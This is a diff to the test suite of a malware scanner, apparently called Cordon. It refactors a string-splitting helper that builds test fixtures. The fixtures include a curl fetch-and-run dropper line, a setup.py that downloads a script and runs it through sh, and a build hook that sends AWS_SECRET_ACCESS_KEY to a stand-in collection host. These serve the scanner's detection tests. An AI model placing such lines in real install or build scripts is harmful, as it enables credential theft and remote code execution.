@@ -24,9 +24,9 @@ import pytest
 
 from cordon_scanner import Scanner
 from cordon_scanner.core.models import Category
-from support import assemble
+from support import Support
 
-FETCH = assemble("cur", "l -fsSL https://cdn.example.invalid/")
+FETCH = Support.assemble("cur", "l -fsSL https://cdn.example.invalid/")
 """Split so this file does not read as a payload to Cordon's scan of itself.
 The tool gets no exception for its own test suite, which is the point."""
 
@@ -96,14 +96,16 @@ class TestStartingAProcessIsNotRunningWhatYouDownloaded:
         ],
     )
     def test_actually_running_it_still_is(self, tmp_path, template: str) -> None:
-        line = template.format(f=FETCH, x=assemble("E", "X"), y=assemble("Str", "ing"))
+        line = template.format(
+            f=FETCH, x=Support.assemble("E", "X"), y=Support.assemble("Str", "ing")
+        )
         (tmp_path / "install.sh").write_text(f"#!/bin/sh\n{line}\n", encoding="utf-8")
         assert "SUSPECT.DROPPER.001" in rules_for(tmp_path)
 
     def test_an_interpreter_given_a_downloaded_string_is_execution(self, tmp_path) -> None:
         """`subprocess.run(["sh", "-c", downloaded])` labelled only as a
         process start, which is indistinguishable from running `git status`."""
-        fetch = assemble("urlop", "en")
+        fetch = Support.assemble("urlop", "en")
         (tmp_path / "setup.py").write_text(
             "import subprocess, urllib.request\n"
             f'script = urllib.request.{fetch}("https://cdn.example.invalid/i.sh").read()\n'
@@ -120,7 +122,7 @@ class TestCiIsNotAnInstallHook:
 
     SCRIPT = (
         "#!/bin/bash\n"
-        f"TOKEN=$(vault read -field={assemble('tok', 'en')} secret/ci/store)\n"
+        f"TOKEN=$(vault read -field={Support.assemble('tok', 'en')} secret/ci/store)\n"
         f'{FETCH.replace("-fsSL ", "-s -X POST ")}_doc" -H "Authorization: $TOKEN" -d @out.json\n'
     )
 
@@ -133,8 +135,8 @@ class TestCiIsNotAnInstallHook:
     def test_the_same_code_in_a_build_hook_is(self, tmp_path) -> None:
         (tmp_path / "setup.py").write_text(
             "import os, urllib.request\n"
-            f"token = os.environ[{assemble('AWS_SECRET', '_ACCESS_KEY')!r}]\n"
-            f'urllib.request.{assemble("urlop", "en")}("https://collect.example.invalid/?t=" + token)\n',
+            f"token = os.environ[{Support.assemble('AWS_SECRET', '_ACCESS_KEY')!r}]\n"
+            f'urllib.request.{Support.assemble("urlop", "en")}("https://collect.example.invalid/?t=" + token)\n',
             encoding="utf-8",
         )
         assert "MALWARE.EXFIL.001" in rules_for(tmp_path)
